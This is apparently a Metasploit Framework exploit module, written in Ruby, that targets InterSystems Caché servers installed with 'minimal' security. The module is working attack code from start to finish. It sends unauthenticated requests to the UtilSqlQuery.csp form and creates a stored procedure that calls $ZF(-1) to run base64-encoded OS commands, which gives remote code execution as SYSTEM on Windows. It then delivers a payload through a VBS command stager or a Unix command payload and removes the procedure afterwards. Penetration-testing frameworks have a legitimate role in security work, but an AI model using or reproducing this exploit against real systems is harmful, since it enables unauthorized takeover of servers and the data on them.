##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit
    Rank = GreatRanking

    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::CmdStagerVBS
    include Msf::Exploit::FileDropper

    def initialize(info = {})
        super(update_info(info,
            'Name'            => 'Intersystems Cache Remote Code Execution
(via Default Minimal Security Install)',
            'Description'     => %q{
                This module exploits default installations of Intersystems
Cache which use the 'minimal' initial security settings, unless changed
during/post installation.
                Anonymous users are granted permissions to '%All' roles
within Cache, allowing for remote code execution to be achieved by creating
a Cache SQL stored procedure which leverages
                the 'Cache Object Script' scripting engine to execute
commands under the context of SYSTEM for default windows installations, or
non privileged 'cacheserver' for default *nix installations.

                },
            'Author'          =>['Bruk0ut'],
            'License'         => MSF_LICENSE,
            'References'      =>[ 'URL', 'tbd'],
            'DisclosureDate' => 'Nov 18 2013',
            'Platform'       => ['win', 'unix'],
            'Targets'        =>
                [
                    [
                        'Windows Universal (CMDStagerVBS)',
                        {
                            'Platform' => 'win',
                            'Arch' => ARCH_X86
                        }
                    ],

                    [
                        'Unix Universal (CMD)',
                        {
                            'Platform' => 'unix',
                            'Arch' => ARCH_CMD
                        }
                    ]
                ],
            'DefaultTarget'  => 0,
            'Privileged'     => true #SYSTEM for windows, non priv'd
cacheserver acct for *nix
            ))

        register_options(
            [
                Opt::RPORT(57772),
                OptString.new('TARGETURI', [ true, 'Path to SqlQuery form',
'/csp/sys/exp/UtilSqlQuery.csp']),
                OptString.new('CMD', [ false, 'Execute this command instead
of using command stager or Payload', "" ]),
                OptString.new('STORED_PROC_NAME', [true, 'Stored Procedure
name to create','random_alpha'])
            ], self.class)

        register_advanced_options(
            [
                OptBool.new('DELETE_FILES', [ true, 'Delete the dropped
files after exploitation', true ])
            ], self.class)
    end

    def check
        res = send_request_cgi(
        {
            'uri' => target_uri.path,
            'method' => 'GET',
        },20)

        if (res.code == 401 or res.code == 404 or res.body =~ /user name/
or res.body =~ /User Name/)
            Exploit::CheckCode::Safe
            # either not found or UtilSqlQuery.csp is protected by
authentication (non default install)
        else
            Exploit::CheckCode::Vulnerable
        end
    end



    def create_sql_procedure(procname)
        # create Cache SQL stored procedure which uses Cache Object Script
to acheive arbritrary code execution
        print_status("Creating Cache SQL Stored Procedure: #{procname}")
        rce_func = "CREATE FUNCTION #{procname}(CMD TEXT) PROCEDURE RETURNS
TEXT LANGUAGE OBJECTSCRIPT\n"
        rce_func << "{\n"
        rce_func << "Set rez = $ZF(-1,
##class(%SYSTEM.Encryption).Base64Decode(CMD))\r\n"
        rce_func << 'Write "rce_cmd_complete"' + "\r\n"
        rce_func << "}\r\n"
        res = send_request_cgi(
        {
            'uri' => target_uri.path,
            'method' => 'POST',
            'vars_post' =>
            {
                '$NAMESPACE' => '%SYS',
                '$CLASS' => '%CSP.UI.SQL.QueryForm',
                '$FRAME' => '_top',
                '$FORMURL' => Rex::Text.uri_encode(target_uri.path),
                '$AUTOFORM_EXECUTE' => 'Execute Query',
                'RuntimeMode' => 'Logical Mode',
                'MaxRows' => '1000',
                'IEworkaound' => '',
                'Query' => rce_func
            }
        },20)

        if (not res or res.code == 500 or res.code==404)
            abort("Did not receive expected response... quitting")
        elsif (res.code == 401 or res.body =~ /user name/ or res.body =~
/User Name/)
            abort("UtilSqlQuery.csp is protected by authentication...
quitting")
        end

        #after initial form POST, server sends a 302 re-direct which must
be followed to complete the request
        if (res.headers['LOCATION'])
            exec_url = res.headers['LOCATION']
            res = send_request_cgi(
            {
                'uri' => exec_url,
                'method' => 'GET',
            },20)
        else
            abort("Could not parse exec url... quitting")
        end
    end

    def drop_sql_procedure(procname)
        #Stored Procedure cleanup... rm as no longer required
        print_status("Dropping Cache SQL Stored Procedure: #{procname}")
        res = send_request_cgi(
        {
            'uri' => target_uri.path,
            'method' => 'POST',
            'vars_post' =>
            {
                '$NAMESPACE' => '%SYS',
                '$CLASS' => '%CSP.UI.SQL.QueryForm',
                '$FRAME' => '_top',
                '$FORMURL' => Rex::Text.uri_encode(target_uri.path),
                '$AUTOFORM_EXECUTE' => 'Execute Query',
                'RuntimeMode' => 'Logical Mode',
                'MaxRows' => '1000',
                'IEworkaound' => '',
                'Query' => "DROP FUNCTION #{procname}"
            }
        },20)

        if (not res or res.code == 500 or res.code==404)
            abort("Did not receive expected response... quitting")
        end

        #after initial form POST, server sends a 302 re-direct which must
be followed to complete the request
        if (res.headers['LOCATION'])
            exec_url = res.headers['LOCATION']
            res = send_request_cgi(
            {
                'uri' => exec_url,
                'method' => 'GET',
            },20)
        else
            abort("Could not parse exec url... quitting")
        end
    end


    def exploit
        #randomize stored procedure name
        if datastore['STORED_PROC_NAME'] == 'random_alpha'
            datastore['STORED_PROC_NAME'] = rand_text_alpha(6)
        end

        #create stored procedure to acheive RCE
        create_sql_procedure(datastore['STORED_PROC_NAME'])

        #if CMD option is set, instead of using a payload, execute only
this command, prefixed with 'cmd /c ' if target is Windows, or no prefix if
*nix
        if not datastore['CMD'].empty?
            if target.name =~ /Windows/
                print_status("Executing command: cmd /c
#{datastore['CMD']}")
                execute_command("cmd /c #{datastore['CMD']}")
            else
                print_status("Executing command: #{datastore['CMD']}")
                execute_command(datastore['CMD'])
            end
            return
        end

        #if target is Windows, launch payload via CMDStagerVBS
        if target.name =~ /Windows/
            execute_cmdstager( { :linemax => 1500 })

        #if *nix, execute CMD payload directly
        else
            print_status("Executing UNIX CMD Payload #{payload.encoded}")
            execute_command(payload.encoded)
        end

        #clean up stored procedure
        drop_sql_procedure(datastore['STORED_PROC_NAME'])
        handler
    end

    def execute_command(cmd, opts = {})
        cmd = Rex::Text.encode_base64(cmd)
        #launch pre-created stored procedure and pass cmd as arg
        res = send_request_cgi(
        {
            'uri' => target_uri.path,
            'method' => 'POST',
            'vars_post' =>
            {
                '$NAMESPACE' => '%SYS',
                '$CLASS' => '%CSP.UI.SQL.QueryForm',
                '$FRAME' => '_top',
                '$FORMURL' => Rex::Text.uri_encode(target_uri.path),
                '$AUTOFORM_EXECUTE' => 'Execute Query',
                'RuntimeMode' => 'Logical Mode',
                'MaxRows' => '1000',
                'IEworkaound' => '',
                'Query' => "SELECT
#{datastore['STORED_PROC_NAME']}('#{cmd}')"
            }
        },20)

        if (not res or res.code == 500 or res.code==404)
            abort("Did not receive expected response... quitting")
        end

        #after initial form POST, server sends a 302 re-direct which must
be followed to complete the request
        if (res.headers['LOCATION'])
            exec_url = res.headers['LOCATION']
            res = send_request_cgi(
            {
                'uri' => exec_url,
                'method' => 'GET',
            },20)
        else
            abort("Could not parse exec url... quitting")

        end

        #stored procedure outputs the string below to confirm that it
executed
        if not res.body =~ /rce_cmd_complete/
            abort("Unable to confirm if SQL stored procedure can be
executed properly... quitting")
        end
    end
end
